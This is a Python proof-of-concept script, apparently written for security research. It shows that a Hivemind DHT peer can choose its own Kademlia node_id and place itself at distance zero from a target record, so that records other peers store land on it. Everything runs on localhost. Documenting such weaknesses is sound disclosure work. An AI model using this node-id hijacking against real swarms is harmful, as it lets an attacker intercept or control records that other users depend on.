"""
Minimal reproduction: a Hivemind peer can choose its own Kademlia node_id, and
honest peers accept it.

The node_id decides which DHT records a peer stores (custody is XOR distance
between the key's hash and each peer's node_id). It is a separate value from the
libp2p PeerID, which is a hash of the public key and is authenticated by TLS.

Run:
    .venv/bin/python research/repro_node_id.py

Expected: the requested node_id is adopted verbatim, and an *independent* honest
peer ranks it nearest to that address and admits it to its routing table.

Everything binds to 127.0.0.1; no external network is touched.
"""

import asyncio

from hivemind.dht.node import DHTNode
from hivemind.dht.routing import DHTID
from hivemind.utils.timed_storage import get_dht_time

LOCALHOST = ["/ip4/127.0.0.1/tcp/0"]

# A deliberately arbitrary 160-bit identifier -- visibly not the output of a hash.
CHOSEN = DHTID(0xDEADBEEFDEADBEEFDEADBEEFDEADBEEFDEADBEEF)

# A realistic target: the address that owns a given record.
KEY = "some_valuable_key"


async def main() -> None:
    bootstrap = await DHTNode.create(host_maddrs=LOCALHOST)
    initial_peers = [str(addr) for addr in await bootstrap.get_visible_maddrs()]
    honest = [await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST) for _ in range(4)]

    # --- 1. an arbitrary identifier is taken verbatim -----------------------
    attacker = await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST, node_id=CHOSEN)
    print(f"requested node_id : {int(CHOSEN):#042x}")
    print(f"adopted  node_id  : {int(attacker.node_id):#042x}")
    print(f"identical         : {int(attacker.node_id) == int(CHOSEN)}")
    print(f"its PeerID        : {attacker.peer_id}")
    print("                    (a genuine hash of its keypair -- but unrelated to the node_id above)")

    await asyncio.sleep(2)  # let the swarm settle

    # --- 2. an INDEPENDENT honest peer is the judge -------------------------
    found = await honest[0].find_nearest_nodes([CHOSEN], k_nearest=3)
    print(f"\nan honest peer asked 'who is nearest to {int(CHOSEN):#x}?'")
    for rank, node_id in enumerate(found[CHOSEN].keys(), start=1):
        marker = "  <- the crafted peer, XOR distance 0" if int(node_id) == int(CHOSEN) else ""
        print(f"  {rank}. {int(node_id):#042x}{marker}")
    print(f"accepted into that honest peer's routing table: {CHOSEN in honest[0].protocol.routing_table}")

    # --- 3. the same trick aimed at a real record ---------------------------
    target = DHTID.generate(source=KEY)
    thief = await DHTNode.create(initial_peers=initial_peers, host_maddrs=LOCALHOST, node_id=DHTID(int(target)))
    await asyncio.sleep(2)

    await honest[1].store(KEY, "secret", expiration_time=get_dht_time() + 60)
    nearest_honest = min(int(h.node_id) ^ int(target) for h in honest)
    print(f"\ntargeting the record {KEY!r} (address {int(target):#x}):")
    print(f"  nearest honest peer sits at XOR distance 2^{nearest_honest.bit_length() - 1}")
    print(f"  crafted peer sits at XOR distance {int(thief.node_id) ^ int(target)}")
    print(f"  an honest peer stored the record; it landed on the crafted peer: "
          f"{'YES' if target in thief.protocol.storage else 'no'}")

    for node in [bootstrap, attacker, thief, *honest]:
        await node.shutdown()


if __name__ == "__main__":
    asyncio.run(main())
